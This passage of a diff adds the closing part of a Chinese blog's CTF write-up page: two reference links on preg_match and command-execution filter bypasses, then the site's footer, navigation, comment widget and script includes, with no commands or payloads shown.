+            alt="https://pic.imgdb.cn/item/65353dbdc458853aef1c3d28.jpg">
+    </a></figure></p>
+<p>​</p>
+<p>​</p>
+<p><strong>参考文章</strong></p>
+<ul>
+<li><a href="https://www.php.net/manual/zh/function.preg-match.php" target="_blank" rel="noopener noreferrer">preg_match()函数</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/391439312" target="_blank" rel="noopener noreferrer">命令执行(RCE)面对各种过滤</a></li>
+</ul>
+</div>
+
+        <div class="sponsor">
+        <div class="sponsor-avatar"></div><div class="sponsor-custom"><hr><p><em>写博客的初衷在于深入掌握技术而非展示</em></p><p><em>当我站在传授他人的角度思考问题时</em></p><p><em>才能真正领悟并融会贯通</em></p><p><em>博客受益者也是未来那个遗忘某个技术的自己</em></p><hr></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2023-10-22</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/gxyctf2019ping-ping-ping/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/rce%E6%BC%8F%E6%B4%9E/">RCE漏洞</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bexec/" class="prev" rel="prev" title="[ACTF2020 新生赛]Exec"><i class="fas fa-angle-left fa-fw"></i>[ACTF2020 新生赛]Exec</a>
+            <a href="/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="next" rel="next" title="[强网杯 2019]随便注">[强网杯 2019]随便注<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="waline" class="comment"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/">Waline</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container">
+            <div class="footer-line">
+                <span id="run-time"></span>
+            </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer">Lyrio</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp">闽ICP备2023013172号</span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div><script>
+                    if('serviceWorker' in navigator) {
+                        navigator.serviceWorker
+                            .register('/sw.min.js', { scope: '/' })
+                            .then(function(registration) {
+                            });
+                
+                        navigator.serviceWorker
+                            .ready
+                            .then(function(registration) {
+                            });
+                    }
+                </script></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/@waline/waline.css"><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/lightgallery/lightgallery.min.css"><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="http://cdn.wutongliran.top/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="http://cdn.wutongliran.top/lib/katex/copy-tex.min.css"></noscript><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":200},"comment":{"waline":{"comment":true,"copyright":true,"dark":"body[theme='dark'], body[theme='black']","el":"#waline","lang":"zh-cn","pageview":true,"serverURL":"https://t0o3gjxg.api.lncldglobal.com"}},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"table":{"sort":true},"twemoji":true};</script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/@waline/waline.js" defer></script><script type="text/javascript" src="/js/waline.min.js" defer></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/twemoji/twemoji.min.js" defer></script><script type="text/javascript" src="/js/twemoji.min.js" defer></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="http://cdn.wutongliran.top/lib/custom/custom.js"></script></div>
+</body>
+
+</html>
